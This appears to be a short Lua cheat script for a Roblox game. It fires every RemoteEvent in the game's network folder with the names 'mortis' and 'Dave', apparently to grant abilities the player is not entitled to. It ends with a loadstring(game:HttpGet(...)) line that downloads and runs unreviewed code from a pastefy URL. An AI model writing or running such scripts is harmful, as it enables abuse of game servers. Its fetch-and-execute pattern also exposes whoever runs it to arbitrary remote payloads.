-- Mortis and dave
local function NetworkEvent(Name)
	local success, error = pcall(function()
		for i,v in pairs(game:GetService("ReplicatedStorage")._NETWORK:GetChildren()) do
			if v:IsA("RemoteEvent") and not v.Name:find("Radio") then
				v:FireServer(Name)
			end
		end
	end)
end

NetworkEvent("mortis")
NetworkEvent("Dave")

-- Extra free dave ability script work for ks only
loadstring(game:HttpGet('https://pastefy.app/Tau7Gnno/raw'))()